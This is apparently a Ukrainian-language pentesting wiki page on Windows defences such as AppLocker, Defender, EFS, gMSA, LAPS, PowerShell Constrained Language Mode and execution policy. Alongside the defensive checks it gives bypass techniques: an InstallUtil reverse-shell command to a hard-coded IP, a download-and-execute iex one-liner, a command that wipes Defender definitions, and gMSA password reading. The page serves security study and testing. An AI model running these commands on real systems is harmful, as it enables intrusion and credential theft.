# Засоби безпеки Windows

{{#include ../banners/hacktricks-training.md}}

## Політика AppLocker

Білий список програм — це перелік схвалених програм або виконуваних файлів, яким дозволено бути присутніми в системі та запускатися в ній. Його мета — захистити середовище від шкідливого malware та несанкціонованого програмного забезпечення, яке не відповідає конкретним потребам організації.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) — це **рішення Microsoft для створення білого списку програм**, яке дає системним адміністраторам змогу контролювати, **які програми та файли можуть запускати користувачі**. Воно забезпечує **гнучкий контроль** над виконуваними файлами, скриптами, файлами інсталятора Windows, DLL, пакетованими програмами та інсталяторами пакетованих програм.\
Організації часто **блокують cmd.exe і PowerShell.exe** та доступ на запис до певних директорій, **але все це можна обійти**.

### Перевірка

Перевірте, які файли/розширення внесено до чорного/білого списку:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` перевіряє файли-кандидати для певного облікового запису відповідно до політики AppLocker. Перевіряйте обліковий запис, маркер якого використовуватиметься для запуску payload, оскільки правила можуть застосовуватися до користувачів або груп; `Get-AppLockerFileInformation` також стане в пригоді для перевірки шляху, хешу та метаданих видавця, за якими можуть збігатися правила.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Перш ніж вважати відхилений результат тестування ознакою блокування, перевірте **фактичний режим застосування правил цієї колекції** та стан служби Application Identity. `AuditOnly` оцінює правила, але все одно дозволяє виконання, а `NotConfigured` не означає, що застосування вимкнено, якщо в цій колекції є правила.<sup>[[7]](#references)</sup> Зупинена служба `AppIDSvc` перешкоджає застосуванню AppLocker.<sup>[[9]](#references)</sup> Ці перевірки дають змогу відрізнити фактичний обхід від політики, яка взагалі не блокувала файл.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

Для контрольного тесту виконання перевірте журнал подій AppLocker: **8003/8006** означають, що EXE/DLL або скрипт/MSI було б заблоковано в режимі аудиту; **8004/8007** означають, що його фактично заблоковано. Перевіряйте той самий тип файлу та ідентичність, що й у запланованому шляху виконання.<sup>[[8]](#references)</sup>

Цей шлях реєстру містить конфігурації та політики, застосовані AppLocker, і дає змогу переглянути поточний набір правил, що діють у системі:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Корисні **папки з правом запису** для обходу політики AppLocker: якщо AppLocker дозволяє виконувати будь-що в `C:\Windows\System32` або `C:\Windows`, можна скористатися **папками з правом запису**, щоб **обійти це**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Загальновідомі бінарні файли [**"LOLBAS's"**](https://lolbas-project.github.io/), яким **довіряють**, також можуть бути корисними для обходу AppLocker.
- **Правила, складені недбало, також можна обійти**
  - Наприклад, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**: можна створити **папку з назвою `allowed`** будь-де, і її буде дозволено.
  - Організації також часто зосереджуються на **блокуванні виконуваного файлу `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, але забувають про **інші** [**розташування виконуваних файлів PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), як-от `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` або `PowerShell_ISE.exe`.
- **Примусове застосування правил до DLL вмикають дуже рідко** через додаткове навантаження на систему та потребу в значному тестуванні, щоб переконатися, що нічого не зламається. Тож використання **DLL як бекдорів допоможе обійти AppLocker**.
- За допомогою [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) можна **виконувати** код **Powershell** у будь-якому процесі й обходити AppLocker. Докладніше див.: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Зберігання облікових даних

### Security Accounts Manager (SAM)

Локальні облікові дані зберігаються в цьому файлі, паролі хешовані.

### Local Security Authority (LSA) - LSASS

**Облікові дані** (хешовані) **зберігаються** в **пам'яті** цієї підсистеми для забезпечення єдиного входу (Single Sign-On).\
**LSA** керує локальною **політикою безпеки** (політикою паролів, дозволами користувачів...), **автентифікацією**, **токенами доступу**...\
Саме LSA **перевіряє** надані облікові дані у файлі **SAM** (під час локального входу) і **зв'язується** з **контролером домену**, щоб автентифікувати користувача домену.

**Облікові дані** **зберігаються** в **процесі LSASS**: квитки Kerberos, хеші NT і LM, паролі, які легко розшифрувати.

### Секрети LSA

LSA може зберігати деякі облікові дані на диску:

- Пароль облікового запису комп'ютера в Active Directory (якщо контролер домену недоступний).
- Паролі облікових записів служб Windows
- Паролі для запланованих завдань
- Інше (пароль застосунків IIS...)

### NTDS.dit

Це база даних Active Directory. Вона є лише на контролерах домену.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) — це антивірус, доступний у Windows 10 і Windows 11, а також у версіях Windows Server. Він **блокує** поширені інструменти pentesting, як-от **`WinPEAS`**. Однак є способи **обійти ці засоби захисту**.

### Перевірка

Щоб перевірити **стан** **Defender**, можна виконати командлет PS **`Get-MpComputerStatus`** (перевірте значення **`RealTimeProtectionEnabled`**, щоб дізнатися, чи він активний):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Для переліку його параметрів також можна виконати:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Зашифрована файлова система (EFS)

EFS захищає файли за допомогою шифрування, використовуючи **симетричний ключ**, відомий як **ключ шифрування файлу (FEK)**. Цей ключ шифрується **відкритим ключем** користувача й зберігається в метаданих NTFS-файлу `$EFS` (`$LOGGED_UTILITY_STREAM`), **а не** у звичайному альтернативному потоці даних `$DATA`.<sup>[[10]](#references)</sup> Для розшифрування відповідний **закритий ключ** цифрового сертифіката користувача розгортає FEK. Налаштований агент відновлення даних (DRA) має окрему зашифровану копію FEK у полі відновлення даних.<sup>[[13]](#references)</sup>

**Сценарії розшифрування без ініціації користувачем**:

- Під час переміщення файлів або папок до файлової системи без EFS, наприклад [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), вони автоматично розшифровуються.
- Зашифровані файли, що передаються мережею через протокол SMB/CIFS, розшифровуються перед передаванням.

Цей метод шифрування забезпечує **прозорий доступ** власника до зашифрованих файлів. Однак проста зміна пароля власника й вхід до системи не дають змоги розшифрувати файли.

**Основні висновки**:

- EFS використовує симетричний FEK, зашифрований відкритим ключем користувача.
- Для доступу до FEK під час розшифрування використовується закритий ключ користувача.
- Автоматичне розшифрування відбувається за певних умов, наприклад під час копіювання до FAT32 або передавання мережею.
- Власник має доступ до зашифрованих файлів без додаткових дій.

### Перевірка інформації EFS

Не робіть висновок про використання EFS на підставі `%APPDATA%\Microsoft\Protect`: там зберігаються головні ключі DPAPI для багатьох функцій Windows.<sup>[[19]](#references)</sup> Натомість перевірте зашифрований файл командою `cipher /c "C:\path\file"`, щоб переглянути сертифікати користувача та відновлення. Команди `cipher /e` і `cipher /d` шифрують і розшифровують файли для суб’єкта, який має відповідний закритий ключ.<sup>[[11]](#references)</sup>

### Розшифрування файлів EFS

Якщо `cipher /c` показує сертифікат відновлення і ви маєте відповідний **закритий ключ DRA** у файлі PFX, імпортуйте цей PFX до сховища сертифікатів поточного користувача, а потім розшифруйте файл.<sup>[[11]](#references)[[12]](#references)</sup> Щойно створений сертифікат DRA не може розшифрувати старі файли: його відкритий ключ мав бути включений під час шифрування файлу. Доступ через ACL NTFS або лише скидання пароля облікового запису не надають потрібного закритого ключа.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Отримання повноважень System

Цей підхід вимагає, щоб **користувач-жертва** **запустив** **процес** на хості. Якщо це так, із сеансу `meterpreter` можна видати себе за токен процесу користувача (`impersonate_token` з `incognito`). Або можна виконати `migrate` у процес користувача.

#### Знання пароля користувача

Mimikatz може імпортувати сертифікат і приватний ключ користувача, а потім використати їх для розшифрування файлів, захищених EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Керовані облікові записи служб груп (gMSA)

Microsoft розробила **Group Managed Service Accounts (gMSA)**, щоб спростити керування обліковими записами служб в ІТ-інфраструктурах. На відміну від традиційних облікових записів служб, для яких часто ввімкнено параметр "**Password never expire**", gMSA пропонують безпечніше рішення, яким простіше керувати:

- **Автоматичне керування паролями**: gMSA використовують складний пароль довжиною 240 байтів, який зазвичай змінюється кожні 30 днів. Контролери домену виводять його з матеріалу ключа KDS, що усуває потребу в ручному оновленні пароля.<sup>[[16]](#references)[[20]](#references)</sup>
- **Підвищена безпека**: ці облікові записи не блокуються, і їх не можна використовувати для інтерактивного входу, що підвищує їхню безпеку.
- **Підтримка кількох хостів**: gMSA можна використовувати на кількох хостах, тому вони ідеально підходять для служб, що працюють на кількох серверах.
- **Підтримка запланованих завдань**: на відміну від керованих облікових записів служб, gMSA підтримують запуск запланованих завдань.
- **Спрощене керування SPN**: система автоматично оновлює Service Principal Name (SPN), якщо змінюються дані sAMaccount комп’ютера або його DNS-ім’я, спрощуючи керування SPN.

Контролер домену під час читання формує атрибут LDAP _**msDS-ManagedPassword**_ на основі похідного від KDS матеріалу пароля; це значення не є окремо збереженим паролем. Зазвичай воно змінюється кожні 30 днів.<sup>[[20]](#references)</sup> Повернений [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) **не є зашифрованим паролем**: його поле `CurrentPassword` містить пароль у відкритому вигляді.<sup>[[14]](#references)</sup> Доступ перевіряється за атрибутом `msDS-GroupMSAMembership`, тож до сфери перевірки належать усі суб’єкти безпеки, яким надано права на отримання пароля, а не лише адміністратори чи хости служб.<sup>[[15]](#references)</sup> З’єднання LDAP має забезпечувати конфіденційність, наприклад, через LDAPS або ущільнення SASL.<sup>[[20]](#references)</sup>

Щоб вивести пароль офлайн після витоку кореневого ключа KDS, див. [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Прочитати цей пароль можна за допомогою [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Знайдіть більше інформації в цій публікації**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Також перегляньте цю [вебсторінку](https://cube0x0.github.io/Relaying-for-gMSA/) про те, як виконати **NTLM relay attack**, щоб **прочитати** **пароль** **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Під час переліку розрізняйте **legacy Microsoft LAPS** і вбудовану реалізацію **Windows LAPS**. Windows LAPS з’явився в оновленнях Windows від 11 квітня 2023 року й може зберігати резервну копію керованого пароля локального адміністратора в **Windows Server Active Directory** або **Microsoft Entra ID**. У розгортаннях із резервним копіюванням в AD він також може шифрувати паролі, зберігати історію зашифрованих паролів і керувати паролем DSRM контролера домену. Завантажуваний застарілий MSI вважається застарілим у новіших версіях Windows, хоча Windows LAPS може працювати в режимі емуляції застарілої версії.<sup>[[6]](#references)</sup>

Оскільки legacy Microsoft LAPS і Windows LAPS — це окремі реалізації, перш ніж застосовувати атаки, специфічні для певних атрибутів або cmdlet, визначте, яка з них розгорнута. На пов’язаній сторінці описано виявлення, перелік ACL, отримання паролів, зміну терміну дії та офлайн-відновлення без повторення цих процедур тут.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

У [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) PowerShell **обмежується використання багатьох функцій**, необхідних для ефективної роботи з PowerShell, зокрема блокується використання COM-об’єктів, дозволяються лише затверджені типи .NET, робочі процеси на основі XAML, класи PowerShell тощо.

### **Перевірка**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` був застарілим способом downgrade лише на хостах, де було встановлено додатковий рушій PowerShell 2. Він більше не входить до оновлених Windows 11 24H2 або Windows Server 2025; не вважайте його актуальним способом обходу CLM.<sup>[[17]](#references)</sup> За ввімкненого контролю програм PowerShell запускає недовірений код у Constrained Language, тоді як скрипти, яким довіряє політика, можуть виконуватися в Full Language.<sup>[[18]](#references)</sup>

Для старіших конфігурацій можна скористатися [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Щоб скомпілювати його, може знадобитися** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> додати `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` і **змінити проєкт на .Net4.5**.

#### Прямий bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Можна скористатися [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконувати код Powershell** у будь-якому процесі та обходити обмежений режим. Докладніше дивіться тут: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).<sup>[[1]](#references)</sup>

## Політика виконання PS

За замовчуванням встановлено значення **restricted.** Основні способи обійти цю політику:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Більше можна знайти [тут](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Інтерфейс постачальника служб безпеки (SSPI)

Це API, який можна використовувати для автентифікації користувачів.

SSPI відповідає за пошук відповідного протоколу для двох машин, які хочуть обмінюватися даними. Перевага надається Kerberos. Потім SSPI узгоджує, який протокол автентифікації використовувати. Ці протоколи автентифікації називаються Security Support Provider (SSP), містяться на кожній машині Windows у вигляді DLL, і обидві машини мають підтримувати той самий протокол, щоб мати змогу обмінюватися даними.

### Основні SSP

- **Kerberos**: переважний варіант
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** і **NTLMv2**: для сумісності
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: вебсервери та LDAP, пароль у вигляді хешу MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL і TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: використовується для узгодження протоколу (Kerberos або NTLM, за замовчуванням — Kerberos)
  - %windir%\Windows\System32\lsasrv.dll

#### Під час узгодження можуть пропонуватися кілька методів або лише один.

## UAC — контроль облікових записів користувачів

[Контроль облікових записів користувачів (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка показує **запит на підтвердження дій із підвищеними привілеями**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [Обхід AppLocker і режиму обмеженої мови PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [як розшифрувати файли EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Ретрансляція для gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 способів обійти політику виконання PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Використання командлетів Windows PowerShell для AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Огляд Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Робота з правилами AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Використання перегляду подій з AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [Процеси AppLocker і взаємодія між ними](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Потоки файлів (локальні файлові системи)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Команда Cipher](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Команда Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Резервне копіювання закритого ключа агента відновлення EFS](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [Атрибут ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Захист групових керованих службових облікових записів](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Функції, вилучені з клієнтських версій Windows](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [Захист PowerShell за допомогою App Control](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Подія 4693 і головні ключі DPAPI](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [Формування msDS-ManagedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
